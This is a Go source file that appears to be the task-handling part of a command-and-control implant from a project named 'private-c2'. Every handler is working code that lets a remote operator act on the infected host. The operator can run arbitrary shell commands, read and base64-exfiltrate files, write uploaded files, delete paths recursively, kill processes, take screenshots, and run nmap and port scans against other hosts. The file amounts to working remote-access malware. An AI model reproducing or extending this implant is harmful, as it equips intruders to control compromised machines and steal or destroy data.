package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"

	"github.com/azizbinmohammad/private-c2/implant/modules/network"
	"github.com/azizbinmohammad/private-c2/implant/modules/nmap"
	"github.com/azizbinmohammad/private-c2/implant/modules/process"
	"github.com/azizbinmohammad/private-c2/implant/modules/screenshot"
	"github.com/azizbinmohammad/private-c2/pkg/protocol"
	"github.com/azizbinmohammad/private-c2/pkg/taskargs"
)

// taskHandler executes one task type. Args are the operator-supplied string
// carried by the wire protocol; each handler defines its own encoding.
type taskHandler func(ctx context.Context, args string) (string, error)

var taskHandlers = map[string]taskHandler{
	protocol.TaskShell:      handleShell,
	protocol.TaskLS:         handleLS,
	protocol.TaskPwd:        handlePwd,
	protocol.TaskCd:         handleCd,
	protocol.TaskPS:         handlePS,
	protocol.TaskCat:        handleCat,
	protocol.TaskUpload:     handleUpload,
	protocol.TaskDownload:   handleDownload,
	protocol.TaskScreenshot: handleScreenshot,
	protocol.TaskNmap:       handleNmap,
	protocol.TaskScan:       handleScan,
	protocol.TaskMkdir:      handleMkdir,
	protocol.TaskRm:         handleRm,
	protocol.TaskCp:         handleCp,
	protocol.TaskMv:         handleMv,
	protocol.TaskKill:       handleKill,
	protocol.TaskIfconfig:   handleIfconfig,
	protocol.TaskNetstat:    handleNetstat,
	protocol.TaskPortscan:   handlePortscan,
	protocol.TaskResolve:    handleResolve,
}

var networkModule = network.NewModule(nil)

// handleTask dispatches a task to its registered handler.
func handleTask(ctx context.Context, task protocol.TaskWire) (string, error) {
	h, ok := taskHandlers[task.Type]
	if !ok {
		return "", fmt.Errorf("unknown task type: %s", task.Type)
	}
	return h(ctx, task.Args)
}

func executeShell(ctx context.Context, cmdStr string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/c", cmdStr)
	} else {
		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", cmdStr)
	}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func handleShell(ctx context.Context, args string) (string, error) {
	return executeShell(ctx, args)
}

func handleLS(_ context.Context, args string) (string, error) {
	dir := args
	if dir == "" {
		dir = "."
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		return "", err
	}
	var sb strings.Builder
	for _, e := range entries {
		info, infoErr := e.Info()
		if infoErr != nil {
			sb.WriteString(fmt.Sprintf("%s\n", e.Name()))
			continue
		}
		sb.WriteString(fmt.Sprintf("%s\t%d\t%s\n", info.Mode(), info.Size(), e.Name()))
	}
	return sb.String(), nil
}

func handlePwd(_ context.Context, _ string) (string, error) {
	return os.Getwd()
}

func handleCd(_ context.Context, args string) (string, error) {
	if err := os.Chdir(args); err != nil {
		return "", err
	}
	return args, nil
}

func handlePS(ctx context.Context, _ string) (string, error) {
	return executeShell(ctx, "ps aux")
}

func handleCat(_ context.Context, args string) (string, error) {
	data, err := os.ReadFile(args)
	if err != nil {
		return "", err
	}
	return string(data), nil
}

func handleUpload(_ context.Context, args string) (string, error) {
	// Args format: "base64data|/path/to/file"
	parts := strings.SplitN(args, "|", 2)
	if len(parts) != 2 {
		return "", fmt.Errorf("upload args must be 'base64data|filepath'")
	}
	decoded, err := base64.StdEncoding.DecodeString(parts[0])
	if err != nil {
		return "", fmt.Errorf("decode base64: %w", err)
	}
	if err := os.WriteFile(parts[1], decoded, 0644); err != nil {
		return "", err
	}
	return fmt.Sprintf("wrote %d bytes to %s", len(decoded), parts[1]), nil
}

func handleDownload(_ context.Context, args string) (string, error) {
	data, err := os.ReadFile(args)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(data), nil
}

func handleScreenshot(ctx context.Context, args string) (string, error) {
	result, err := screenshot.Execute(ctx, []byte(args))
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(result), nil
}

func handleNmap(ctx context.Context, args string) (string, error) {
	// Scans run on this host, so nmap has to be installed here. Empty args
	// is the operator asking whether it is.
	return nmap.Execute(ctx, args)
}

func handleScan(ctx context.Context, args string) (string, error) {
	// Structured port/service/vulnerability scan. Unlike "nmap" this returns
	// JSON rather than nmap's own text, so the operator surfaces can render
	// services and findings as tables. Args is a JSON
	// {"target","profile"}; the result is returned even alongside an error,
	// because a scan cut short at its deadline still found what it found.
	out, err := nmap.Scan(ctx, []byte(args))
	return string(out), err
}

func handleMkdir(_ context.Context, args string) (string, error) {
	if strings.TrimSpace(args) == "" {
		return "", fmt.Errorf("mkdir requires a path")
	}
	if err := os.MkdirAll(args, 0755); err != nil {
		return "", err
	}
	return fmt.Sprintf("created directory %s", args), nil
}

func handleRm(_ context.Context, args string) (string, error) {
	if strings.TrimSpace(args) == "" {
		return "", fmt.Errorf("rm requires a path")
	}
	if err := os.RemoveAll(args); err != nil {
		return "", err
	}
	return fmt.Sprintf("removed %s", args), nil
}

// splitPair accepts either "src|dst" or two whitespace-separated fields.
func splitPair(args string) (string, string, error) {
	if strings.Contains(args, "|") {
		parts := strings.SplitN(args, "|", 2)
		if strings.TrimSpace(parts[0]) == "" || strings.TrimSpace(parts[1]) == "" {
			return "", "", fmt.Errorf("source and destination are required")
		}
		return parts[0], parts[1], nil
	}
	parts := strings.Fields(args)
	if len(parts) != 2 {
		return "", "", fmt.Errorf("args must be 'source|destination'")
	}
	return parts[0], parts[1], nil
}

func handleCp(_ context.Context, args string) (string, error) {
	src, dst, err := splitPair(args)
	if err != nil {
		return "", err
	}
	in, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer in.Close()

	info, err := in.Stat()
	if err != nil {
		return "", err
	}
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, info.Mode())
	if err != nil {
		return "", err
	}
	n, copyErr := io.Copy(out, in)
	closeErr := out.Close()
	if copyErr != nil {
		return "", copyErr
	}
	if closeErr != nil {
		return "", closeErr
	}
	return fmt.Sprintf("copied %d bytes from %s to %s", n, src, dst), nil
}

func handleMv(_ context.Context, args string) (string, error) {
	src, dst, err := splitPair(args)
	if err != nil {
		return "", err
	}
	if err := os.Rename(src, dst); err != nil {
		return "", err
	}
	return fmt.Sprintf("moved %s to %s", src, dst), nil
}

func handleKill(ctx context.Context, args string) (string, error) {
	pid, err := strconv.Atoi(strings.TrimSpace(args))
	if err != nil || pid <= 0 {
		return "", fmt.Errorf("kill requires a positive PID")
	}
	req, _ := json.Marshal(process.Request{Op: process.OpKill, PID: pid})
	out, err := process.Execute(ctx, req)
	return string(out), err
}

func handleIfconfig(ctx context.Context, _ string) (string, error) {
	req, _ := json.Marshal(network.Request{Op: network.OpIfconfig})
	out, err := networkModule.Execute(ctx, req)
	return string(out), err
}

func handleNetstat(ctx context.Context, _ string) (string, error) {
	req, _ := json.Marshal(network.Request{Op: network.OpNetstat})
	out, err := networkModule.Execute(ctx, req)
	return string(out), err
}

// parsePortscanArgs is kept as a thin wrapper so tests and callers share the
// parser implementation in pkg/taskargs.
func parsePortscanArgs(args string) (string, []int, error) {
	return taskargs.ParsePortscan(args)
}

func parsePorts(s string) ([]int, error) {
	return taskargs.ParsePorts(s)
}

func handlePortscan(ctx context.Context, args string) (string, error) {
	target, ports, err := parsePortscanArgs(args)
	if err != nil {
		return "", err
	}
	req, _ := json.Marshal(network.Request{Op: network.OpPortscan, Target: target, Ports: ports})
	out, err := networkModule.Execute(ctx, req)
	return string(out), err
}

func handleResolve(ctx context.Context, args string) (string, error) {
	if strings.TrimSpace(args) == "" {
		return "", fmt.Errorf("resolve requires a hostname")
	}
	req, _ := json.Marshal(network.Request{Op: network.OpResolve, Target: args})
	out, err := networkModule.Execute(ctx, req)
	return string(out), err
}
